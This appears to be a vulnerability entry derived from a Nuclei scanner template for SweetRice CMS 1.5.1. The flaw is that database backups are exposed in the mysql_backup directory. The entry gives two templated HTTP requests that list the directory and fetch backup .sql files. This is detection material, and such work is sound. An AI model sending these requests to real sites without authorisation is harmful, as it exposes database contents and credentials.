# Vulnerability: SweetRice CMS 1.5.1 - Backup Disclosure
**Classification:** SWEETRICE
**Source:** Nuclei Template (`sweetrice-backup-disclosure.yaml`)

## Description
Detected SweetRice-specific backups and generic .sql files exposed via directory listing in the SweetRice mysql_backup directory.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /inc/mysql_backup/ HTTP/1.1
Host: {{Hostname}}

GET /inc/mysql_backup/{{backup_file}} HTTP/1.1
Host: {{Hostname}}
```

